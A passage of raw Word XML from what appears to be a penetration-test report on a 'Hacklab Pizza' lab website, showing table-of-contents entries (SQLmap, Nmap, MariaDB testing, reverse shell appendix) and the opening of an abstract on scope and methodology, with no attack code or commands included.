              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.5</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836628 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7BC668A0" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836629" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.6</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836629 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="05A8B418" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836630" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.7</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836630 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3411BAD6" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836631" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.8</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836631 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>70</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="27396D79" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836632" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.9</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836632 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>70</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="61298A9B" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836633" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.10</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836633 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>70</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="11B7395F" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836634" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>7.11 SQLmap results</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836634 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>70</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3D20BBEA" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836635" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>9.1 Nmap Scan</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836635 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2BD5E803" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836636" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>9.2 MariaDB Pen Test</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836636 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="48327310" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836637" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>10.1 Reverse Shell Code</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836637 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5274FA96" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836638" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix D - Include your project deliverables and requirements sheet</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836638 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>79</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6CBE3B29" w14:textId="77777777" w:rsidR="00A60D20" w:rsidRDefault="00404615">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="58F07899" w14:textId="77777777" w:rsidR="00C5090A" w:rsidRDefault="00C5090A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:sectPr w:rsidR="00C5090A" w:rsidSect="00C5090A">
          <w:footerReference w:type="default" r:id="rId11"/>
          <w:footerReference w:type="first" r:id="rId12"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="299"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C4F6438" w14:textId="77777777" w:rsidR="001905B9" w:rsidRDefault="00341658" w:rsidP="00C5090A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc58836561"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="03B39C47" w14:textId="4F8D3AAB" w:rsidR="00DA638E" w:rsidRDefault="00DA638E" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc58836562"/>
      <w:r>
        <w:t>Abstract</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157EAAE5" w14:textId="3B4FA700" w:rsidR="00EB748F" w:rsidRPr="00292DEC" w:rsidRDefault="00B16117" w:rsidP="00DA638E">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>This report contains a comprehensive evaluation of the security</w:t>
      </w:r>
      <w:r w:rsidR="000C512E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the client website. </w:t>
      </w:r>
      <w:r w:rsidR="00EB748F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>The scope of this analysis is the Hacklab Pizza</w:t>
      </w:r>
      <w:r w:rsidR="00422359" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> website and related services</w:t>
      </w:r>
      <w:r w:rsidR="00EB748F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> which will be referred to as “the web application” or “the website”</w:t>
      </w:r>
      <w:r w:rsidR="00FB4A8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> in this report</w:t>
      </w:r>
      <w:r w:rsidR="00EB748F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>, . This includes any databases directly connected to the web application and those which serve a purpose on the web application. This means that despite finding other databases on the server, these where beyond the established scope and therefore ignored.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78108EF4" w14:textId="79C66C69" w:rsidR="00DA638E" w:rsidRPr="00292DEC" w:rsidRDefault="000C512E" w:rsidP="00DA638E">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>In order to ensure the report is truly comprehensive</w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> a clear methodology has been followed</w:t>
      </w:r>
      <w:r w:rsidR="00EB748F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> which breaks down the web application into its component parts, such as client side controls or session management, and then constructs a series of test for these parts</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> that ensures as many avenues are analysed as possible.</w:t>
      </w:r>
      <w:r w:rsidR="00695205" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007B2E6C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">This includes the use of certain tools to assist in the mapping and exploitation of the website. However, these tools have been chosen to limit the risk of damaging the web application and their use </w:t>
      </w:r>
      <w:r w:rsidR="00422359" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>has been</w:t>
      </w:r>
      <w:r w:rsidR="007B2E6C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> limited to essential tests. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E9C061" w14:textId="356C15B3" w:rsidR="005D3EC8" w:rsidRPr="00292DEC" w:rsidRDefault="005D3EC8" w:rsidP="00DA638E">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">This report outlines the benefits it brings to the client, while also acknowledging the limitations such a report has. </w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00422359" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">identifies </w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>and direct</w:t>
      </w:r>
      <w:r w:rsidR="00422359" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve"> efforts to limit security vulnerabilities on the website</w:t>
      </w:r>
      <w:r w:rsidR="00CE106A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidR="00CD6D8F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
